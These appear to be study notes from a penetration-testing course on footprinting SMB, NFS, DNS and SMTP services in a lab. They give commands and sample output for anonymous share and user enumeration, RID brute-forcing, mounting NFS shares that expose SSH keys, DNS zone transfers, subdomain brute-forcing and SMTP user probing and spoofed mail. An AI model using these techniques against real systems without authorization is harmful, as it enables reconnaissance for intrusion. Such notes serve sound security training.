* `querydominfo`: Requests internal structural counters, server role specifications, and account totals.
* `netshareenumall`: Lists all available local shares along with their absolute directory definitions.
* `netsharegetinfo notes`: Queries extensive access settings, access tokens, permissions, and security identifiers (SIDs) for the specified share (`notes`).
* **Combined Output:**

Plaintext

```
rpcclient $> srvinfo
        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
        
rpcclient $> enumdomains
name:[DEVSMB] idx:[0x0]
name:[Builtin] idx:[0x1]

rpcclient $> querydominfo
Domain:         DEVOPS
Server:         DEVSMB
Comment:        DEVSM
Total Users:    2
Total Groups:   0
Total Aliases:  0
Sequence No:    1632361158
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

rpcclient $> netshareenumall
netname: print$
        remark: Printer Drivers
        path:   C:\var\lib\samba\printers
        password:
netname: home
        remark: INFREIGHT Samba
        path:   C:\home\
        password:
netname: dev
        remark: DEVenv
        path:   C:\home\sambauser\dev\
        password:
netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
netname: IPC$
        remark: IPC Service (DEVSM)
        path:   C:\tmp
        password:
        
rpcclient $> netsharegetinfo notes
netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00 
                Specific bits: 0x1ff
                Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
                SID: S-1-1-0
```

#### Enumerating Users and Relative Identifiers (RIDs)

* `enumdomusers`: Queries the system for local accounts and exposes their unique structural Relative Identifier hex value (`rid`).
* `queryuser 0x3e9`: Pulls granular account parameters for the explicit user matching that unique RID block.
* **Combined User Query Output:**

Plaintext

```
rpcclient $> enumdomusers
user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]

rpcclient $> queryuser 0x3e9
        User Name   :   cry0l1t3
        Full Name   :   cry0l1t3
        Home Drive  :   \\devsmb\cry0l1t3
        Dir Drive   :
        Profile Path:   \\devsmb\cry0l1t3\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
        Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
        Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST
        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x3e9
        group_rid:      0x201
        acb_info :      0x00000014
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...

rpcclient $> queryuser 0x3e8
        User Name   :   mrb3n
        Full Name   :
        Home Drive  :   \\devsmb\mrb3n
        Dir Drive   :
        Profile Path:   \\devsmb\mrb3n\profile
...SNIP...
```

#### Group Assessment via Group RID

Plaintext

```
rpcclient $> querygroup 0x201
```

* **Output:**

Plaintext

```
        Group Name:     None
        Description:    Ordinary Users
        Group Attribute:7
        Num Members:2
```

### 6. Automating RID Brute Forcing via Bash Loop

Bash

```
Umedh@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

* **Command Breakdown:**
  * `for i in $(seq 500 1100); do ... done`: Creates a loop checking numerical ID sequences standard for accounts (500 to 1100).
  * `printf '%x\n' $i`: Converts the loop integer index value into hexadecimal format.
  * `-c`: Directs `rpcclient` to launch, fire the command string argument (`queryuser`), and instantly exit.
  * `grep "User Name\|user_rid\|group_rid"`: In-line text optimization to isolate matching account profiles out of the stream.
* **Output:**

Plaintext

```
        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201

        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201

        User Name   :   cry0l1t3
        user_rid :      0x3e9
        group_rid:      0x201
```

### 7. Specialized Exploitation & Auditing Tools

#### SAMR Account Mining via Impacket (`samrdump.py`)

Bash

```
samrdump.py 10.129.14.128
```

* **About the Tool:** Part of the Impacket library, `samrdump.py` communicates with the Security Account Manager Remote (SAMR) interface to automatically discover and list system accounts.
* **Output:**

Plaintext

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Retrieving endpoint list from 10.129.14.128
Found domain(s): . DEVSMB . Builtin
[*] Looking up users in domain DEVSMB
Found user: mrb3n, uid = 1000
Found user: cry0l1t3, uid = 1001
mrb3n (1000)/FullName: mrb3n (1000)/UserComment: 
...SNIP...
[*] Received 2 entries.
```

#### Share Mapping (`smbmap`)

Bash

```
smbmap -H 10.129.14.128
```

* **About the Tool:** `smbmap` lets execution tasks assess an entire host network layout for open permissions on files and directories.
* **Command Breakdown:**
  * `-H`: Points to the specific target host address.
* **Output:**

Plaintext

```
[+] Finding open SMB ports....
[+] User SMB session established on 10.129.14.128...
[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                             
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        home                                                    NO ACCESS       INFREIGHT Samba
        dev                                                     NO ACCESS       DEVenv
        notes                                                   NO ACCESS       CheckIT
        IPC$                                                    NO ACCESS       IPC Service (DEVSM)
```

#### Network Auditing Engine (`crackmapexec`)

Bash

```
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```

* **About the Tool:** `crackmapexec` (CME) is a post-exploitation utility that helps automate security assessments of large networks.
* **Command Breakdown:**
  * `smb`: Specifies the target protocol.
  * `--shares`: Instructs CME to check and list share permissions.
  * `-u '' -p ''`: Passes an empty username and password to test anonymous access.
* **Output:**

Plaintext

```
SMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.14.128   445    DEVSMB           [+] \: 
SMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares
SMB         10.129.14.128   445    DEVSMB           Share           Permissions     Remark
SMB         10.129.14.128   445    DEVSMB           -----           -----------     ------
SMB         10.129.14.128   445    DEVSMB           print$                          Printer Drivers
SMB         10.129.14.128   445    DEVSMB           home                            INFREIGHT Samba
SMB         10.129.14.128   445    DEVSMB           dev                             DEVenv
SMB         10.129.14.128   445    DEVSMB           notes           READ,WRITE      CheckIT
SMB         10.129.14.128   445    DEVSMB           IPC$                            IPC Service (DEVSM)
```

### 8. Complete Automation Script (`enum4linux-ng`)

`enum4linux-ng` is a modern rewrite of the original perl-based `enum4linux`, designed to automate the discovery and enumeration of information from Windows and Samba systems.

#### Installation Actions

Bash

```
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt
```

* **Command Breakdown:**
  * `git clone`: Downloads the tool's source code from GitHub.
  * `cd`: Changes the working directory to the newly cloned repository.
  * `pip3 install -r`: Installs all required Python dependencies listed in the `requirements.txt` file.
* **Output:** _(Standard download and package compilation text loops)_

#### Full Target Scanning

Bash

```
./enum4linux-ng.py 10.129.14.128 -A
```

* **Command Breakdown:**
  * `-A`: Runs a complete enumeration scan (combines user discovery, share checks, password policy extraction, group mapping, and OS fingerprinting into a single run).
* **Output:**

Plaintext

```
ENUM4LINUX - next generation ==========================
|    Target Information    |
==========================
[*] Target ........... 10.129.14.128
...
[+] Got domain/workgroup name: DEVOPS
[+] Full NetBIOS names information:
- DEVSMB          <00> -         H <ACTIVE>  Workstation Service
...
[+] Supported dialects and settings:
Preferred dialect: SMB 3.0
SMB signing required: false
...
[+] Server allows session using username '', password ''
...
[+] After merging user results we have 2 users total:
'1000':  username: mrb3n
'1001':  username: cry0l1t3
...
[+] Found 5 share(s):
notes:  comment: CheckIT  type: Disk
[*] Testing share notes
[+] Mapping: OK, Listing: OK
...
domain_password_information:
  min_pw_length: 5
...
Completed after 0.61 seconds
```

#### 1. Reconstructing `smb.conf` from the Outside

When an administrator modifies a setting in `/etc/samba/smb.conf`, the Samba daemon immediately changes how it responds to network queries. Pentesters use specific tools to map out those responses, effectively revealing the backend settings:

* **If `browseable = yes` is set:** When you run `smbclient -L //10.129.202.5`, the server returns a complete list of every available share name. If it was set to `no`, the list would return empty.
* **If `guest ok = yes` is set:** When you try to connect anonymously (`smbclient -N //10.129.202.5/sharename`), the server grants you a successful login prompt instead of an `ACCESS_DENIED` error.
* **If `read only = no` is set:** Tools like `smbmap` or `crackmapexec` will explicitly print `READ, WRITE` next to the folder name, telling you exactly how that parameter is configured.

| **Query**                 | **Description**                                                    |
| ------------------------- | ------------------------------------------------------------------ |
| `srvinfo`                 | Server information.                                                |
| `enumdomains`             | Enumerate all domains that are deployed in the network.            |
| `querydominfo`            | Provides domain, server, and user information of deployed domains. |
| `netshareenumall`         | Enumerates all available shares.                                   |
| `netsharegetinfo <share>` | Provides information about a specific share.                       |
| `enumdomusers`            | Enumerates all domain users.                                       |
| `queryuser <RID>`         | Provides information about a specific user.                        |

***

***

## NFS

#### Reconstructing `/etc/exports` from the Outside

The exact same logic applies to the Linux Network File System (NFS) configuration files.

* When you run the command `showmount -e 10.129.202.5`, the RPC service on the target server looks directly inside the local `/etc/exports` file and broadcasts its exact lines over the network to your machine.
* It tells you exactly which folder paths are shared and which network IP addresses are allowed to mount them.

### 1. System Reading and Appending Files

#### Displaying the NFS Exports Configurations

Bash

```
cat /etc/exports
```

* **About the Tool:** `cat` (concatenate) prints the text contents of local files directly to the standard output terminal stream.
* **Command Breakdown:** Reads the baseline static configuration definitions table that dictates which local directories are exported over the network.
* **Output:**

Plaintext

```
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
```

#### Adding New Shares and Restarting Kernels

Bash

```
echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
systemctl restart nfs-kernel-server
exportfs
```

* **About the Tools:**
  * `echo`: Appends standard input text into streams.
  * `systemctl`: The core background service system manager interface.
  * `exportfs`: An administrative tool that maintains the active table of exported filesystems for NFS.
* **Command Breakdown:**
  * `>>`: Appends string lines to the target file without overwriting existing contents.
  * `restart nfs-kernel-server`: Refreshes and updates the active kernel listener thread states.
  * `exportfs`: Forces the kernel to output its currently loaded active export allocations.
* **Output:**

Plaintext

```
/mnt/nfs        10.129.14.0/24
```

### 2. Advanced Network Mapping via Nmap

#### Baseline RPC Port Auditing

Bash

```
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
```

* **About the Tool:** `nmap` is an advanced port scanner and network security auditing engine.
* **Command Breakdown:**
  * `-p111,2049`: Targets Port 111 (`rpcbind`) and Port 2049 (`nfs`) exclusively.
  * `-sV`: Dictates service version discovery sweeps.
  * `-sC`: Uses built-in default Nmap Scripting Engine (NSE) rules to extract registered RPC structures.
* **Output:**

Plaintext

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:12 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00018s latency).

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      45837/tcp   mountd
|   100021  1,3,4      44629/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
```

#### Automation Script Scanning (NSE Wildcards)

Bash

```
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
```

* **Command Breakdown:**
  * `--script nfs*`: Tells Nmap to execute every script matching the "nfs" name prefix to pull disk statistics and list directory file hierarchies.
* **Output:**

Plaintext

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:37 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| nfs-ls: Volume /mnt/nfs
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .
| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa
| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub
| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share
|_
| nfs-showmount: 
|_  /mnt/nfs 10.129.14.0/24
| nfs-statfs: 
|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink
|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000
2049/tcp open  nfs_acl 3 (RPC #100227)
...SNIP...
```

### 3. Remote Filesystem Mounting and Navigation

#### Enumerating Remote Mount Points

Bash

```
showmount -e 10.129.14.128
```

* **About the Tool:** `showmount` queries a remote host's RPC mount daemon to reveal its network share architecture tables.
* **Command Breakdown:**
  * `-e`: Explicitly displays the server's external export list definitions.
* **Output:**

Plaintext

```
Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```

#### Establishing Mount Points & Directory Mapping

Bash

```
mkdir target-NFS
sudo mount -t nfs -o nolock 10.129.202.41:/TechSupport /mnt/tec
cd target-NFS
tree .
```

* **About the Tools:**
  * `mount`: Links remote network directories directly into your local storage layout tree.
  * `tree`: Generates a clean, depth-indented visual mapping diagram of file path layouts.
* **Command Breakdown:**
  * `-t nfs`: Declares the operational filesystem type as Network File System.
  * `10.129.14.128:/`: Identifies the source directory anchor point on the remote machine.
  * `-o nolock`: Disables file locking optimizations, which is often required when connecting from older pentest clients or unauthenticated connections.
* **Output:**

Plaintext

```
.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
```

### 4. Permission Auditing (UID & GID Harvesting)

#### Standard Permission Output

Bash

```
ls -l mnt/nfs/
```

* **About the Tool:** `ls` (list) displays directory contents.
* **Command Breakdown:**
  * `-l`: Uses the long listing format to expose permissions, ownership rules, and timestamps.
* **Output:**

Plaintext

```
total 16
-rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share
```

#### Numerical UID & GID Extractor

Bash

```
ls -n mnt/nfs/
```

* **Command Breakdown:**
  * `-n`: Long listing format, but explicitly drops textual names to expose raw numerical **User IDs (UID)** and **Group IDs (GID)**.
* **Output:**

Plaintext

```
total 16
-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh
-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share
```

### 5. Unmounting Active Directory Links

Bash

```
cd ..
sudo umount ./target-NFS
```

* **About the Tool:** `umount` breaks the active operational mount connection between your local directory anchor and the remote file server.
* **Command Breakdown:** Steps backward out of the active network mount root space so that the mount process can be cleanly detached and terminated without errors.
* **Output:** _(None - returns a clean, successful blank line execution prompt)_

***

***

## DNS

### 1. Static Configuration and Zone Analysis

#### Displaying Local Configuration Blueprints

Bash

```
cat /etc/bind/named.conf.local
```

* **About the Tool:** `cat` (concatenate) prints the plaintext content of local files directly to your standard terminal output stream.
* **Command Breakdown:** Reads the local zone delegation configurations for the `Bind9` DNS server daemon to view which domains are being hosted and their access rules.
* **Output:**

Plaintext

```
zone "domain.com" {
    type master;
    file "/etc/bind/db.domain.com";
    allow-update { key rndc-key; };
};
```

#### Inspecting Forward Zone Files

Bash

```
cat /etc/bind/db.domain.com
```

* **Command Breakdown:** Explores the physical "phonebook" file maps containing the pointers that link system domain names to static numerical IP addresses.
* **Output:**

Plaintext

```
$ORIGIN domain.com
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial
                    21600      ; refresh after 6 hours
                    3600       ; retry after 1 hour
                    604800     ; expire after 1 week
                    86400 )    ; minimum TTL of 1 day

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.
      IN     MX     10     mx.domain.com.
server1      IN     A       10.129.14.5
ftp          IN     CNAME   server1
www          IN     CNAME   server2
```

#### Inspecting Reverse Pointer Mapping Files

Bash

```
cat /etc/bind/db.10.129.14
```

* **Command Breakdown:** Explores the reverse lookup zone file configuration, which handles converting raw IP addresses back into Fully Qualified Domain Names (FQDNs) using **PTR** records.
* **Output:**

Plaintext

```
$ORIGIN 14.129.10.in-addr.arpa
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. ( ... )
      IN     NS     ns1.domain.com.
5    IN     PTR    server1.domain.com.
```

### 2. Advanced DNS Interrogation via `dig`

#### 🆕 Tool Deep Dive: `dig` (Domain Information Groper)

`dig` is a command-line tool used for querying Domain Name System name servers. It performs DNS lookups and displays the answers returned from the name server(s) that were queried. Pentesters rely on it because it outputs the raw, unedited flags and sections sent directly back by the target server.

#### Standard DNS Record Inquiries (SOA, NS, ANY, & CHAOS)

Bash

```
dig soa www.inlanefreight.com
dig ns inlanefreight.htb @10.129.14.128
dig CH TXT version.bind 10.129.120.85
dig any inlanefreight.htb @10.129.14.128
```

* **Command Option Breakdown:**
  * `soa`: Requests the **Start of Authority** record (reveals the admin contact email and primary zone master serialization).
  * `ns`: Requests the **Name Server** records (identifies which systems hold the official authority for the zone domain entries).
  * `@10.129.14.128`: Forces `dig` to bypass your local system's default network DNS servers and query that exact target IP address directly on Port 53.
  * `CH TXT version.bind`: Uses the **CHAOS** class protocol query space instead of the standard Internet (**IN**) space to ask the software daemon to print out its raw internal compiled version string flag.
  * `any`: Instructs the server to dump every record type (A, MX, TXT, NS) it holds matching that root domain.
* **Outputs:**

Plaintext

```
;; QUESTION SECTION:
;www.inlanefreight.com.         IN      SOA
;; AUTHORITY SECTION:
inlanefreight.com.      900     IN      SOA     ns-161.awsdns-20.com. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400

;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.
;; ADDITIONAL SECTION:
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136

;; ANSWER SECTION:
version.bind.       0       CH      TXT     "9.10.6-P1-Debian"

;; ANSWER SECTION:
inlanefreight.htb.      604800  IN      TXT     "v=spf1 include:mailgun.org..."
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800...
```

#### Full Zone Transfer Attacks (`axfr`)

Bash

```
dig axfr inlanefreight.htb @10.129.14.128
dig axfr internal.inlanefreight.htb @10.129.14.128
```

* **Command Option Breakdown:**
  * `axfr`: Asynchronous Full Transfer Zone. This options initiates a request to replicate the _entire_ database zone layout file. If the administrator misconfigured `allow-transfer` to `any` or a wide subnet, this command completely maps out all hosts, subdomains, and layouts instantly without needing to guess names.
* **Outputs:**

Plaintext

```
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800...
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
internal.inlanefreight.htb. 604800 IN   A       10.129.1.6
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
```

### 3. Automation and Subdomain Discovery

#### Automated Bash Brute-Force Loops

Bash

```
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```

* **Command Composition Breakdown:**
  * `for sub in $(cat <wordlist>); do ... done`: Creates an active parsing loop running through thousands of standard hostname strings (like `www`, `mail`, `dev`, `vpn`).
  * `grep -v ';\|SOA'`: Filters out the structural commentary metadata lines returned by `dig`.
  * `sed -r '/^\s*$/d'`: Stream editor configuration that purges blank lines from printing out to the terminal interface.
  * `tee -a subdomains.txt`: Simultaneously prints the successfully discovered host lines to the terminal screen and appends them cleanly into an output file.
* **Output:**

Plaintext

```
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
```

#### 🆕 Tool Deep Dive: `dnsenum`

`dnsenum` is a multi-threaded perl script designed to enumerate DNS information of a domain and discover non-contiguous blocks. It automates several lookup actions sequentially, including checking for zone transfers, querying versions, and running dictionaries against subdomains in parallel.

Bash

```
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

* **Command Option Breakdown:**
  * `--dnsserver 10.129.14.128`: Points the tool directly to the specific name server IP handling the target network requests.
  * `--enum`: Shortcut setting that executes all primary baseline actions (axfr, extra lookups, reverse lookups).
  * `-p 0`: Limits the total number of initial pages of google search results scraped for subdomains to zero (disables OSINT scraping).
  * `-s 0`: Disables scraping calculations against subdomains via Netcraft.
  * `-o subdomains.txt`: Saves all valid uncovered target records cleanly into an output text file.
  * `-f <wordlist>`: Overrides default software dictionaries to feed your precise, targeted wordlist into the subdomain brute-forcing engine.
* **Output:**

Plaintext

```
dnsenum VERSION:1.2.6
-----   inlanefreight.htb   -----

Name Servers:
______________
ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136

Trying Zone Transfers and getting Bind Versions:
_________________________________________________
Trying Zone Transfer for inlanefreight.htb on ns.inlanefreight.htb ...
AXFR record query failed: no nameservers

Brute forcing with /home/cry0l1t3/Pentesting/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:
_______________________________________________________________________________________________________
ns.inlanefreight.htb.                    604800   IN    A        10.129.34.136
mail1.inlanefreight.htb.                 604800   IN    A        10.129.18.201
app.inlanefreight.htb.                   604800   IN    A        10.129.18.15
done.
```

| **DNS Record** | **Description**                                                                                                                                                                                                                                                                               |
| -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `A`            | Returns an IPv4 address of the requested domain as a result.                                                                                                                                                                                                                                  |
| `AAAA`         | Returns an IPv6 address of the requested domain.                                                                                                                                                                                                                                              |
| `MX`           | Returns the responsible mail servers as a result.                                                                                                                                                                                                                                             |
| `NS`           | Returns the DNS servers (nameservers) of the domain.                                                                                                                                                                                                                                          |
| `TXT`          | This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.                                             |
| `CNAME`        | This record serves as an alias for another domain name. If you want the domain [www.hackthebox.eu](http://www.hackthebox.eu/) to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a CNAME record for [www.hackthebox.eu](http://www.hackthebox.eu/). |
| `PTR`          | The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.                                                                                                                                                                                 |
| `SOA`          | Provides information about the corresponding DNS zone and email address of the administrative contact.                                                                                                                                                                                        |

***

***

## SMTP

### 1. System Postfix Configuration Review

#### Reading and Cleaning Configuration Files

Bash

```
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```

* **About the Tools:**
  * `cat`: Outputs the raw text content of the Postfix configuration file.
  * `grep -v "#"`: Filters the text stream to **exclude** (`-v`) lines starting with a comment symbol (`#`).
  * `sed -r "/^\s*$/d"`: Uses a regular expression matrix to delete (`d`) all blank lines or lines containing only spaces.
* **Output:**

Plaintext

```
smtpd_banner = ESMTP Server
biff = no
append_dot_mydomain = no
readme_directory = no
compatibility_level = 2
smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache
myhostname = mail1.inlanefreight.htb
alias_maps = hash:/etc/aliases
alias_database = hash:/etc/aliases
smtp_generic_maps = hash:/etc/postfix/generic
mydestination = $myhostname, localhost
masquerade_domains = $myhostname
mynetworks = 127.0.0.0/8 10.129.0.0/16
mailbox_size_limit = 0
recipient_delimiter = +
smtp_bind_address = 0.0.0.0
inet_protocols = ipv4
smtpd_helo_restrictions = reject_invalid_hostname
home_mailbox = /home/postfix
```

### 2. Interactive Service Enumeration via Telnet

#### �� Tool Deep Dive: `telnet`

`telnet` is a legacy network protocol utility used to establish an unencrypted, interactive communication channel over a raw TCP socket connection. In penetration testing, it is commonly used to manually interact with plaintext protocols like SMTP (Port 25), HTTP (Port 80), or POP3 (Port 110) to verify banners and test manual exploit payloads.

#### Establishing Connection & Feature Discovery (HELO/EHLO)

Bash

```
telnet 10.129.14.128 25
```

* **Command Breakdown:** Initiates a raw text session over target Port 25. Once inside, the following protocol commands are typed manually:
  * `HELO mail1.inlanefreight.htb`: Starts the session by identifying the client computer name.
  * `EHLO mail1`: Requests an **Extended SMTP** greeting, prompting the server to list its supported feature flags.
* **Output:**

Plaintext

```
Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server
HELO mail1.inlanefreight.htb
250 mail1.inlanefreight.htb
EHLO mail1
250-mail1.inlanefreight.htb
250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
```

#### Manual Account Verification (`VRFY`)

Bash

```
telnet 10.129.14.128 25
```

* **Command Breakdown:** Uses the internal protocol utility `VRFY` to check if distinct mailboxes exist.

> **Security Note:** As seen in this output, this specific server is configured with a catch-all trick. It returns a false-positive success code (`252 2.0.0`) for _every_ string tested, rendering automated `VRFY` scripts unreliable against it.

* **Output:**

Plaintext

```
220 ESMTP Server
VRFY root
252 2.0.0 root
VRFY cry0l1t3
252 2.0.0 cry0l1t3
VRFY testuser
252 2.0.0 testuser
VRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa
252 2.0.0 aaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

#### Simulating Mail Spooling & Spoofing

Bash

```
telnet 10.129.14.128 25
```

* **Command Breakdown:** Manually triggers a complete mail delivery sequence line-by-line:
  * `MAIL FROM:`: Declares the origin sender address.
  * `RCPT TO:`: Declares the destination target address.
  * `DATA`: Instructs the engine to interpret all following text as the physical body of the message until a single independent dot (`.`) is passed on its own line.
* **Output:**

Plaintext

```
220 ESMTP Server
EHLO inlanefreight.htb
250-mail1.inlanefreight.htb
...SNIP...
MAIL FROM: <cry0l1t3@inlanefreight.htb>
250 2.1.0 Ok
RCPT TO: <mrb3n@inlanefreight.htb> NOTIFY=success,failure
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
From: <cry0l1t3@inlanefreight.htb>
To: <mrb3n@inlanefreight.htb>
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200

Hey man, I am trying to access our XY-DB but the creds don't work. Did you make any changes there?
.
250 2.0.0 Ok: queued as 6E1CF1681AB
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
```

### 3. Automated Scanning via Nmap

#### Standard Service & Default Script Scan

Bash

```
sudo nmap 10.129.14.128 -sC -sV -p25
```

* **Command Breakdown:**
  * `-p25`: Narrows scan coverage exclusively to the target mail port.
  * `-sV`: Performs service and banner extraction checks.
  * `-sC`: Applies default NSE scripts, automatically invoking `smtp-commands` to pull the capability matrix flag options.
* **Output:**

Plaintext

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.09 seconds
```

#### Checking for Open Relay Misconfigurations

Bash

```
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

* **Command Breakdown:**
  * `--script smtp-open-relay`: Instructs Nmap to cycle through 16 distinct mail routing combinations to verify if unauthenticated outsiders can route outbound spam traffic through this service hub.
  * `-v`: Enables verbose output tracking to display the exact test strings as they execute.
* **Output:**

Plaintext

```
PORT   STATE SERVICE
25/tcp open  smtp
| smtp-open-relay: Server is an open relay (16/16 tests)
